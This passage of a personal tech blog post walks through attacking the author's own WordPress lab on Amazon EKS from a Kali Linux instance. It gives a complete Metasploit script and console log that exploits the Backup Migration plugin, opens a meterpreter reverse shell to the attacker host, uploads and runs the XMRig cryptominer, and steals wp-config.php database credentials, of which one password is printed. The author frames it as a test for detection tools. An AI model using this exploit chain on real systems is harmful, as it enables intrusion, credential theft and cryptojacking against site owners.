ssh <span class="nt">-i</span> <span class="s2">"</span><span class="k">${</span><span class="nv">TMP_DIR</span><span class="k">}</span><span class="s2">/</span><span class="k">${</span><span class="nv">AWS_EC2_KEY_PAIR_NAME</span><span class="k">}</span><span class="s2">.pem"</span> <span class="nt">-o</span> <span class="nv">StrictHostKeyChecking</span><span class="o">=</span>no <span class="s2">"kali@</span><span class="k">${</span><span class="nv">AWS_EC2_KALI_LINUX_PUBLIC_IP</span><span class="k">}</span><span class="s2">"</span> <span class="s1">'curl -Ls https://github.com/ruzickap.keys &gt;&gt; ~/.ssh/authorized_keys'</span>
</pre></table></code></div></div><p>Log in to the Kali Linux instance using SSH and perform the following steps:</p><ul><li>Download the <a href="https://xmrig.com/">XMRig</a> cryptominer<li>Install Metasploit Framework<li>Initialize the Metasploit Framework<li>Use <code class="language-plaintext highlighter-rouge">wordpress_scanner</code> auxiliary module to scan the WordPress Application<li>Use <code class="language-plaintext highlighter-rouge">wp_backup_migration_php_filter</code> exploit module to exploit the WordPress plugin vulnerability<li>Upload the cryptominer to the remote host<li>Execute the cryptominer (run the <a href="https://xmrig.com/">XMRig</a> binary with the <code class="language-plaintext highlighter-rouge">--version</code> option)<li>Download the WordPress config file <code class="language-plaintext highlighter-rouge">wp-config.php</code> and print the database credentials</ul><p><a href="https://user-images.githubusercontent.com/63872951/187396388-1c15dd6e-95a0-438a-ada5-71e49ff17f4e.jpg" class="popup img-link shimmer"><img src="https://user-images.githubusercontent.com/63872951/187396388-1c15dd6e-95a0-438a-ada5-71e49ff17f4e.jpg" alt="Metasploit" width="500" loading="lazy"></a> <em>Metasploit logo</em></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre><span class="c"># shellcheck disable=SC2087</span>
ssh <span class="nt">-i</span> <span class="s2">"</span><span class="k">${</span><span class="nv">TMP_DIR</span><span class="k">}</span><span class="s2">/</span><span class="k">${</span><span class="nv">AWS_EC2_KEY_PAIR_NAME</span><span class="k">}</span><span class="s2">.pem"</span> <span class="nt">-o</span> <span class="nv">StrictHostKeyChecking</span><span class="o">=</span>no <span class="s2">"kali@</span><span class="k">${</span><span class="nv">AWS_EC2_KALI_LINUX_PUBLIC_IP</span><span class="k">}</span><span class="s2">"</span> <span class="o">&lt;&lt;</span> <span class="no">EOF2</span><span class="sh">
curl -Ls https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-static-x64.tar.gz | tar -xvzf - --strip-components=1 --wildcards "*/xmrig"

sudo snap install metasploit-framework
msfdb init

cat &lt;&lt; EOF | msfconsole --quiet --resource -
use auxiliary/scanner/http/wordpress_scanner
set rhost </span><span class="k">${</span><span class="nv">K8S_WORDPRESS_SERVICE</span><span class="k">}</span><span class="sh">
run

use exploit/multi/http/wp_backup_migration_php_filter
set rhost </span><span class="k">${</span><span class="nv">K8S_WORDPRESS_SERVICE</span><span class="k">}</span><span class="sh">
set lhost </span><span class="k">${</span><span class="nv">AWS_EC2_KALI_LINUX_PUBLIC_IP</span><span class="k">}</span><span class="sh">
set lport 443
run

sessions --interact 1 --meterpreter-command ps --meterpreter-command sysinfo </span><span class="se">\</span><span class="sh">
  --meterpreter-command "download /bitnami/wordpress/wp-config.php" </span><span class="se">\</span><span class="sh">
  --meterpreter-command "upload xmrig /tmp/xmrig" </span><span class="se">\</span><span class="sh">
  --meterpreter-command "execute -i -H -f /usr/bin/sh -a '-c </span><span class="se">\"</span><span class="sh">chmod a+x /tmp/xmrig ; /tmp/xmrig --version</span><span class="se">\"</span><span class="sh">'"

exit -y
EOF

grep DB_ wp-config.php
</span><span class="no">EOF2
</span></pre></table></code></div></div><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
</pre><td class="rouge-code"><pre><span class="go">┌──(kali㉿kali)-[~]
</span><span class="gp">└─$</span><span class="w"> </span>curl <span class="nt">-Ls</span> https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-static-x64.tar.gz | <span class="nb">tar</span> <span class="nt">-xvzf</span> - <span class="nt">--strip-components</span><span class="o">=</span>1 <span class="nt">--wildcards</span> <span class="s2">"*/xmrig"</span>
<span class="go">
xmrig-6.21.3/xmrig

┌──(kali㉿kali)-[~]
</span><span class="gp">└─$</span><span class="w"> </span><span class="nb">sudo </span>snap <span class="nb">install </span>metasploit-framework
<span class="go">metasploit-framework v6.4.4-dev from Jitendra Patro (jitpatro) installed
WARNING: There is 1 new warning. See 'snap warnings'.

┌──(kali㉿kali)-[~]
</span><span class="gp">└─$</span><span class="w"> </span>msfdb init
<span class="go">Running the 'init' command for the database:
Creating database at /home/kali/snap/metasploit-framework/common/.msf4/db
Creating db socket file at /home/kali/snap/metasploit-framework/common
Starting database at /home/kali/snap/metasploit-framework/common/.msf4/db...server starting
success
Creating database users
Writing client authentication configuration file /home/kali/snap/metasploit-framework/common/.msf4/db/pg_hba.conf
Stopping database at /home/kali/snap/metasploit-framework/common/.msf4/db
Starting database at /home/kali/snap/metasploit-framework/common/.msf4/db...server starting
success
Creating initial database schema
Database initialization successful

┌──(kali㉿kali)-[~]
</span><span class="gp">└─$</span><span class="w"> </span>msfconsole <span class="nt">--quiet</span>
<span class="go">
 ** Welcome to Metasploit Framework Initial Setup **
    Please answer a few questions to get started.



 ** Metasploit Framework Initial Setup Complete **

This copy of metasploit-framework is more than two weeks old.
 Consider running 'msfupdate' to update to the latest version.
</span><span class="gp">msf6 &gt;</span><span class="w"> </span>use auxiliary/scanner/http/wordpress_scanner
<span class="gp">msf6 auxiliary(scanner/http/wordpress_scanner) &gt;</span><span class="w"> </span><span class="nb">set </span>rhost ab5bc303e73b84fd597cb02c422e1f23-691116016.eu-central-1.elb.amazonaws.com
<span class="gp">rhost =&gt;</span><span class="w"> </span>ab5bc303e73b84fd597cb02c422e1f23-691116016.eu-central-1.elb.amazonaws.com
<span class="gp">msf6 auxiliary(scanner/http/wordpress_scanner) &gt;</span><span class="w"> </span>run
<span class="go">
[*] Trying 3.73.29.183
[+] 3.73.29.183 - Detected Wordpress 6.5
[*] 3.73.29.183 - Enumerating Themes
[*] 3.73.29.183 - Progress  0/3 (0.0%)
[*] 3.73.29.183 - Finished scanning themes
[*] 3.73.29.183 - Enumerating plugins
[*] 3.73.29.183 - Progress   0/63 (0.0%)
[+] 3.73.29.183 - Detected plugin: all-in-one-wp-migration version 7.81
[+] 3.73.29.183 - Detected plugin: backup-backup version 1.3.7
[*] 3.73.29.183 - Finished scanning plugins
[*] 3.73.29.183 - Searching Users
[+] 3.73.29.183 - Detected user: wordpress with username: wordpress
[*] 3.73.29.183 - Finished scanning users
[*] 3.73.29.183 - Finished all scans
[*] Scanned 1 of 2 hosts (50% complete)
[*] Trying 3.120.25.116
[+] 3.120.25.116 - Detected Wordpress 6.5
[*] 3.120.25.116 - Enumerating Themes
[*] 3.120.25.116 - Progress  0/3 (0.0%)
[*] Scanned 1 of 2 hosts (50% complete)
[*] Scanned 1 of 2 hosts (50% complete)
[*] 3.120.25.116 - Finished scanning themes
[*] 3.120.25.116 - Enumerating plugins
[*] 3.120.25.116 - Progress   0/63 (0.0%)
[*] Scanned 1 of 2 hosts (50% complete)
[*] Scanned 1 of 2 hosts (50% complete)
[+] 3.120.25.116 - Detected plugin: all-in-one-wp-migration version 7.81
[+] 3.120.25.116 - Detected plugin: backup-backup version 1.3.7
[*] 3.120.25.116 - Finished scanning plugins
[*] 3.120.25.116 - Searching Users
[+] 3.120.25.116 - Detected user: wordpress with username: wordpress
[*] 3.120.25.116 - Finished scanning users
[*] 3.120.25.116 - Finished all scans
[*] Scanned 2 of 2 hosts (100% complete)
[*] Auxiliary module execution completed
</span><span class="gp">msf6 auxiliary(scanner/http/wordpress_scanner) &gt;</span><span class="w">
</span><span class="gp">msf6 auxiliary(scanner/http/wordpress_scanner) &gt;</span><span class="w"> </span>use exploit/multi/http/wp_backup_migration_php_filter
<span class="go">[*] Using configured payload php/meterpreter/reverse_tcp
</span><span class="gp">msf6 exploit(multi/http/wp_backup_migration_php_filter) &gt;</span><span class="w"> </span><span class="nb">set </span>rhost ab5bc303e73b84fd597cb02c422e1f23-691116016.eu-central-1.elb.amazonaws.com
<span class="gp">rhost =&gt;</span><span class="w"> </span>ab5bc303e73b84fd597cb02c422e1f23-691116016.eu-central-1.elb.amazonaws.com
<span class="gp">msf6 exploit(multi/http/wp_backup_migration_php_filter) &gt;</span><span class="w"> </span><span class="nb">set </span>lhost 52.57.50.4
<span class="gp">lhost =&gt;</span><span class="w"> </span>52.57.50.4
<span class="gp">msf6 exploit(multi/http/wp_backup_migration_php_filter) &gt;</span><span class="w"> </span><span class="nb">set </span>lport 443
<span class="gp">lport =&gt;</span><span class="w"> </span>443
<span class="gp">msf6 exploit(multi/http/wp_backup_migration_php_filter) &gt;</span><span class="w"> </span>run
<span class="go">[*] Exploiting target 3.73.29.183

[-] Handler failed to bind to 52.57.50.4:443:-  -
[*] Started reverse TCP handler on 0.0.0.0:443
[*] Running automatic check ("set AutoCheck false" to disable)
[*] WordPress Version: 6.5
[+] Detected Backup Migration Plugin version: 1.3.7
[+] The target appears to be vulnerable.
[*] Writing the payload to disk, character by character, please wait...
[*] Sending stage (39927 bytes) to 3.74.38.166
[+] Deleted j
[+] Deleted erpY.php
</span><span class="gp">[*] Meterpreter session 1 opened (10.192.10.73:443 -&gt;</span><span class="w"> </span>3.74.38.166:38454<span class="o">)</span> at 2024-04-30 07:08:44 +0000
<span class="go">[*] Session 1 created in the background.
[*] Exploiting target 3.120.25.116
[-] Handler failed to bind to 52.57.50.4:443:-  -
[*] Started reverse TCP handler on 0.0.0.0:443
[*] Running automatic check ("set AutoCheck false" to disable)
[*] WordPress Version: 6.5
[+] Detected Backup Migration Plugin version: 1.3.7
[+] The target appears to be vulnerable.
[*] Writing the payload to disk, character by character, please wait...
[*] Sending stage (39927 bytes) to 3.74.38.166
[+] Deleted t
[+] Deleted erpY.php
</span><span class="gp">[*] Meterpreter session 2 opened (10.192.10.73:443 -&gt;</span><span class="w"> </span>3.74.38.166:43951<span class="o">)</span> at 2024-04-30 07:09:43 +0000
<span class="go">[*] Session 2 created in the background.
</span><span class="gp">msf6 exploit(multi/http/wp_backup_migration_php_filter) &gt;</span><span class="w">
</span><span class="gp">msf6 exploit(multi/http/wp_backup_migration_php_filter) &gt;</span><span class="w"> </span>sessions <span class="nt">--interact</span> 1
<span class="go">[*] Starting interaction with 1...

</span><span class="gp">meterpreter &gt;</span><span class="w"> </span>ps
<span class="go">
Process List
============

 PID  Name                           User  Path
 ---  ----                           ----  ----
 1    /opt/bitnami/apache/bin/httpd  1001  /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
 301  /opt/bitnami/apache/bin/httpd  1001  /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
 302  /opt/bitnami/apache/bin/httpd  1001  /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
 303  /opt/bitnami/apache/bin/httpd  1001  /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
 304  /opt/bitnami/apache/bin/httpd  1001  /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
 305  /opt/bitnami/apache/bin/httpd  1001  /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
 306  /opt/bitnami/apache/bin/httpd  1001  /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
 308  /opt/bitnami/apache/bin/httpd  1001  /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
 309  /opt/bitnami/apache/bin/httpd  1001  /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
 310  /opt/bitnami/apache/bin/httpd  1001  /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
</span><span class="gp"> 311  sh                             1001  sh -c ps ax -w -o pid,user,cmd --no-header 2&gt;</span>/dev/null
<span class="go"> 312  ps                             1001  ps ax -w -o pid,user,cmd --no-header

</span><span class="gp">meterpreter &gt;</span><span class="w">
</span><span class="gp">meterpreter &gt;</span><span class="w"> </span>sysinfo
<span class="go">Computer    : wordpress-7c5479f8-n846l
</span><span class="gp">OS          : Linux wordpress-7c5479f8-n846l 5.10.213-201.855.amzn2.x86_64 #</span>1 SMP Mon Mar 25 18:16:11 UTC 2024 x86_64
<span class="go">Meterpreter : php/linux
</span><span class="gp">meterpreter &gt;</span><span class="w">
</span><span class="gp">meterpreter &gt;</span><span class="w"> </span>download /bitnami/wordpress/wp-config.php
<span class="gp">[*] Downloading: /bitnami/wordpress/wp-config.php -&gt;</span><span class="w"> </span>/home/kali/wp-config.php
<span class="gp">[*] Downloaded 4.19 KiB of 4.19 KiB (100.0%): /bitnami/wordpress/wp-config.php -&gt;</span><span class="w"> </span>/home/kali/wp-config.php
<span class="gp">[*] Completed  : /bitnami/wordpress/wp-config.php -&gt;</span><span class="w"> </span>/home/kali/wp-config.php
<span class="gp">meterpreter &gt;</span><span class="w">
</span><span class="gp">meterpreter &gt;</span><span class="w"> </span>upload xmrig /tmp/xmrig
<span class="gp">[*] Uploading  : /home/kali/xmrig -&gt;</span><span class="w"> </span>/tmp/xmrig
<span class="gp">[*] Uploaded -1.00 B of 7.90 MiB (0.0%): /home/kali/xmrig -&gt;</span><span class="w"> </span>/tmp/xmrig
<span class="gp">[*] Completed  : /home/kali/xmrig -&gt;</span><span class="w"> </span>/tmp/xmrig
<span class="gp">meterpreter &gt;</span><span class="w">
</span><span class="gp">meterpreter &gt;</span><span class="w"> </span>execute <span class="nt">-i</span> <span class="nt">-H</span> <span class="nt">-f</span> /usr/bin/sh <span class="nt">-a</span> <span class="s1">'-c "chmod a+x /tmp/xmrig ; /tmp/xmrig --version"'</span>
<span class="go">Process 316 created.
Channel 3 created.
XMRig 6.21.3
 built on Apr 23 2024 with GCC 13.2.1
 features: 64-bit AES

libuv/1.48.0
OpenSSL/3.0.13
hwloc/2.10.0
[-] core_channel_interact: Operation failed: 1
</span><span class="gp">meterpreter &gt;</span><span class="w"> </span><span class="nb">exit</span> <span class="nt">-y</span>
<span class="go">[*] Shutting down session: 1

[*] 3.73.29.183 - Meterpreter session 1 closed.  Reason: User exit
</span><span class="gp">msf6 exploit(multi/http/wp_backup_migration_php_filter) &gt;</span><span class="w"> </span><span class="nb">exit</span> <span class="nt">-y</span>
<span class="go">
┌──(kali㉿kali)-[~]
</span><span class="gp">└─$</span><span class="w"> </span><span class="nb">grep </span>DB_ wp-config.php
<span class="gp">define( 'DB_NAME', 'bitnami_wordpress' );</span><span class="w">
</span><span class="gp">define( 'DB_USER', 'bn_wordpress' );</span><span class="w">
</span><span class="gp">define( 'DB_PASSWORD', 'vAX0wwd3wR' );</span><span class="w">
</span><span class="gp">define( 'DB_HOST', 'wordpress-mariadb:3306' );</span><span class="w">
</span><span class="gp">define( 'DB_CHARSET', 'utf8' );</span><span class="w">
</span><span class="gp">define( 'DB_COLLATE', '' );</span><span class="w">
</span></pre></table></code></div></div><p>I really like Metasploit’s colors, so I’ve added the logs as images here:</p><p><a href="/assets/img/posts/2024/2024-04-27-exploit-vulnerability-wordpress-plugin-kali-linux-1/kali-linux-metasploit-wordpress_scanner.avif" class="popup img-link shimmer"><img src="/assets/img/posts/2024/2024-04-27-exploit-vulnerability-wordpress-plugin-kali-linux-1/kali-linux-metasploit-wordpress_scanner.avif" alt="Metasploit - wordpress_scanner" width="600" loading="lazy"></a> <em>Metasploit - wordpress_scanner</em></p><p><a href="/assets/img/posts/2024/2024-04-27-exploit-vulnerability-wordpress-plugin-kali-linux-1/kali-linux-metasploit-exploit-wp_backup_migration_php_filter.avif" class="popup img-link shimmer"><img src="/assets/img/posts/2024/2024-04-27-exploit-vulnerability-wordpress-plugin-kali-linux-1/kali-linux-metasploit-exploit-wp_backup_migration_php_filter.avif" alt="Metasploit - wp_backup_migration_php_filter" width="600" loading="lazy"></a> <em>Metasploit - wp_backup_migration_php_filter</em></p><p><a href="https://raw.githubusercontent.com/Qroia/Qroia/af0f0d001bebaebbd340a9e688aaa54a98fa2eb5/configs/gnu-linux/themes/TokyoNight/tokyonight__dark_icons/apps/64/kali-metasploit.svg" class="popup img-link shimmer"><img src="https://raw.githubusercontent.com/Qroia/Qroia/af0f0d001bebaebbd340a9e688aaa54a98fa2eb5/configs/gnu-linux/themes/TokyoNight/tokyonight__dark_icons/apps/64/kali-metasploit.svg" alt="Metasploit" width="100" loading="lazy"></a></p><p>The Metasploit Framework can do many other things with an exploited host. These are basic commands that should be detected by security tools (e.g., Kubernetes runtime protection).</p><h2 id="cleanup"><span class="me-2">Cleanup</span><a href="#cleanup" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Delete the Amazon EKS cluster, the Kali Linux EC2 instance, and the EC2 Key Pair:</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="nb">export </span><span class="nv">AWS_REGION</span><span class="o">=</span><span class="s2">"eu-central-1"</span>
<span class="nb">export </span><span class="nv">AWS_EC2_KEY_PAIR_NAME</span><span class="o">=</span><span class="s2">"ruzickap-test"</span>
<span class="nb">export </span><span class="nv">SOLUTION_KALI</span><span class="o">=</span><span class="s2">"KaliLinux-NICE-DCV"</span>
<span class="nb">export </span><span class="nv">SOLUTION_EKS</span><span class="o">=</span><span class="s2">"Amazon-EKS"</span>
<span class="nb">export </span><span class="nv">TMP_DIR</span><span class="o">=</span><span class="s2">"</span><span class="k">${</span><span class="nv">TMP_DIR</span><span class="k">:-${</span><span class="nv">PWD</span><span class="k">}}</span><span class="s2">"</span>
<span class="nb">export </span><span class="nv">KUBECONFIG</span><span class="o">=</span><span class="s2">"</span><span class="k">${</span><span class="nv">TMP_DIR</span><span class="k">}</span><span class="s2">/kubeconfig-</span><span class="k">${</span><span class="nv">SOLUTION_EKS</span><span class="k">}</span><span class="s2">.conf"</span>

aws cloudformation delete-stack <span class="nt">--stack-name</span> <span class="s2">"</span><span class="k">${</span><span class="nv">SOLUTION_KALI</span><span class="k">}</span><span class="s2">"</span>
aws ec2 delete-key-pair <span class="nt">--key-name</span> <span class="s2">"</span><span class="k">${</span><span class="nv">AWS_EC2_KEY_PAIR_NAME</span><span class="k">}</span><span class="s2">"</span>
<span class="k">if </span>eksctl get cluster <span class="nt">--name</span><span class="o">=</span><span class="s2">"</span><span class="k">${</span><span class="nv">SOLUTION_EKS</span><span class="k">}</span><span class="s2">"</span><span class="p">;</span> <span class="k">then
  </span>eksctl delete cluster <span class="nt">--name</span><span class="o">=</span><span class="s2">"</span><span class="k">${</span><span class="nv">SOLUTION_EKS</span><span class="k">}</span><span class="s2">"</span> <span class="nt">--force</span>
<span class="k">fi
</span>aws cloudformation delete-stack <span class="nt">--stack-name</span> <span class="s2">"</span><span class="k">${</span><span class="nv">SOLUTION_KALI</span><span class="k">}</span><span class="s2">-VPC"</span>
<span class="k">for </span>FILE <span class="k">in</span> <span class="k">${</span><span class="nv">TMP_DIR</span><span class="k">}</span>/<span class="o">{</span>vpc_cloudformation_template.yml,KaliLinux-NICE-DCV.yaml,<span class="k">${</span><span class="nv">AWS_EC2_KEY_PAIR_NAME</span><span class="k">}</span>.pem,helm_values-wordpress.yml,kubeconfig-<span class="k">${</span><span class="nv">SOLUTION_EKS</span><span class="k">}</span>.conf<span class="o">}</span><span class="p">;</span> <span class="k">do
  if</span> <span class="o">[[</span> <span class="nt">-f</span> <span class="s2">"</span><span class="k">${</span><span class="nv">FILE</span><span class="k">}</span><span class="s2">"</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then
    </span><span class="nb">rm</span> <span class="nt">-v</span> <span class="s2">"</span><span class="k">${</span><span class="nv">FILE</span><span class="k">}</span><span class="s2">"</span>
  <span class="k">else
    </span><span class="nb">echo</span> <span class="s2">"*** File not found: </span><span class="k">${</span><span class="nv">FILE</span><span class="k">}</span><span class="s2">"</span>
  <span class="k">fi
done
</span>aws cloudformation <span class="nb">wait </span>stack-delete-complete <span class="nt">--stack-name</span> <span class="s2">"</span><span class="k">${</span><span class="nv">SOLUTION_KALI</span><span class="k">}</span><span class="s2">"</span>
aws cloudformation <span class="nb">wait </span>stack-delete-complete <span class="nt">--stack-name</span> <span class="s2">"</span><span class="k">${</span><span class="nv">SOLUTION_KALI</span><span class="k">}</span><span class="s2">-VPC"</span>
aws cloudformation <span class="nb">wait </span>stack-delete-complete <span class="nt">--stack-name</span> <span class="s2">"eksctl-</span><span class="k">${</span><span class="nv">SOLUTION_EKS</span><span class="k">}</span><span class="s2">-cluster"</span>
</pre></table></code></div></div><p>Enjoy … 😉</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw me-1"></i> <a href="/categories/kubernetes/">Kubernetes</a>, <a href="/categories/amazon-eks/">Amazon EKS</a>, <a href="/categories/security/">Security</a>, <a href="/categories/exploit/">Exploit</a>, <a href="/categories/vulnerability/">Vulnerability</a>, <a href="/categories/kali-linux/">Kali Linux</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw me-1"></i> <a href="/tags/amazon-eks/" class="post-tag no-text-decoration" >Amazon EKS</a> <a href="/tags/k8s/" class="post-tag no-text-decoration" >k8s</a> <a href="/tags/kubernetes/" class="post-tag no-text-decoration" >kubernetes</a> <a href="/tags/security/" class="post-tag no-text-decoration" >security</a> <a href="/tags/eksctl/" class="post-tag no-text-decoration" >eksctl</a> <a href="/tags/kali-linux/" class="post-tag no-text-decoration" >Kali Linux</a> <a href="/tags/exploit/" class="post-tag no-text-decoration" >exploit</a> <a href="/tags/vulnerability/" class="post-tag no-text-decoration" >vulnerability</a> <a href="/tags/wordpress/" class="post-tag no-text-decoration" >WordPress</a> <a href="/tags/plugin/" class="post-tag no-text-decoration" >plugin</a></div><div class=" post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2 " ><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper d-flex align-items-center"> <span class="share-label text-muted">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Exploit%20vulnerability%20in%20a%20WordPress%20plugin%20with%20Kali%20Linux%20-%20Petr's%20Blog&url=https%3A%2F%2Fruzickap.github.io%2Fposts%2Fexploit-vulnerability-wordpress-plugin-kali-linux-1%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter"> <i class="fa-fw fa-brands fa-square-x-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Exploit%20vulnerability%20in%20a%20WordPress%20plugin%20with%20Kali%20Linux%20-%20Petr's%20Blog&u=https%3A%2F%2Fruzickap.github.io%2Fposts%2Fexploit-vulnerability-wordpress-plugin-kali-linux-1%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fruzickap.github.io%2Fposts%2Fexploit-vulnerability-wordpress-plugin-kali-linux-1%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Linkedin" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <button id="copy-link" aria-label="Copy link" class="btn small" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy link" data-title-succeed="Link copied successfully!" > <i class="fa-fw fas fa-link pe-none fs-6"></i> </button> </span></div></div></div></article></main><aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted"><div class="access"><section id="access-lastmod"><h2 class="panel-heading">Recently Updated</h2><ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2"><li class="text-truncate lh-lg"> <a href="/posts/amazon-eks-karpenter-tests/">Amazon EKS - Karpenter tests</a><li class="text-truncate lh-lg"> <a href="/posts/eks-auto-cert-manager-velero/">Amazon EKS Auto Mode with cert-manager and Velero</a><li class="text-truncate lh-lg"> <a href="/posts/secure-cheap-amazon-eks-auto/">Build secure and cheap Amazon EKS Auto Mode</a><li class="text-truncate lh-lg"> <a href="/posts/mcp-servers-k8s/">MCP Servers running on Kubernetes</a><li class="text-truncate lh-lg"> <a href="/posts/ollama-k8s-exploitation/">Exploiting RCE Vulnerabilities in Ollama on Kubernetes</a></ul></section><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/kubernetes/">kubernetes</a> <a class="post-tag btn btn-outline-primary" href="/tags/k8s/">k8s</a> <a class="post-tag btn btn-outline-primary" href="/tags/amazon-eks/">Amazon EKS</a> <a class="post-tag btn btn-outline-primary" href="/tags/eksctl/">eksctl</a> <a class="post-tag btn btn-outline-primary" href="/tags/security/">security</a> <a class="post-tag btn btn-outline-primary" href="/tags/cert-manager/">cert-manager</a> <a class="post-tag btn btn-outline-primary" href="/tags/external-dns/">external-dns</a> <a class="post-tag btn btn-outline-primary" href="/tags/amazon-eks/">amazon eks</a> <a class="post-tag btn btn-outline-primary" href="/tags/oauth2-proxy/">oauth2-proxy</a> <a class="post-tag btn btn-outline-primary" href="/tags/podinfo/">podinfo</a></div></section></div><div class="toc-border-cover z-3"></div><section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4"><h2 class="panel-heading ps-3 pb-2 mb-0">Contents</h2><nav id="toc"></nav></section></aside></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4"><aside id="related-posts" aria-labelledby="related-label"><h3 class="mb-4" id="related-label">Further Reading</h3><nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4"><article class="col"> <a href="/posts/exploit-vulnerability-wordpress-plugin-kali-linux-2/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1715205600" data-df="ll" > May 9, 2024 </time><h4 class="pt-0 my-2">Exploit vulnerability in a WordPress plugin with Kali Linux 2</h4><div class="text-muted"><p>Learn how to exploit a vulnerability in a WordPress plugin running on EC2 using Kali Linux</p></div></div></a></article><article class="col"> <a href="/posts/secure-cheap-amazon-eks/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1695592800" data-df="ll" > Sep 25, 2023 </time><h4 class="pt-0 my-2">Build secure and cheap Amazon EKS</h4><div class="text-muted"><p>Build "cheap and secure" Amazon EKS with network policies, cluster encryption and logging</p></div></div></a></article><article class="col"> <a href="/posts/cilium-amazon-eks/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1691013600" data-df="ll" > Aug 3, 2023 </time><h4 class="pt-0 my-2">Build secure Amazon EKS with Cilium and network encryption</h4><div class="text-muted"><p>Build "cheap and secure" Amazon EKS with Karpenter and Cilium</p></div></div></a></article></nav></aside><nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation"> <a href="/posts/secure-cheap-amazon-eks/" class="btn btn-outline-primary" aria-label="Older" ><p>Build secure and cheap Amazon EKS</p></a> <a href="/posts/secure-cheap-amazon-eks-with-pod-identities/" class="btn btn-outline-primary" aria-label="Newer" ><p>Build secure and cheap Amazon EKS with Pod Identities</p></a></nav><footer aria-label="Site Info" class=" d-flex flex-column justify-content-center text-muted flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3 " ><p>© <time>2025</time> <a href="https://twitter.com/Ruzicka_Petr">Petr Ruzicka</a>. <span data-bs-toggle="tooltip" data-bs-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p><p>Using the <a data-bs-toggle="tooltip" data-bs-placement="top" title="v7.4.1" href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener" >Chirpy</a> theme for <a 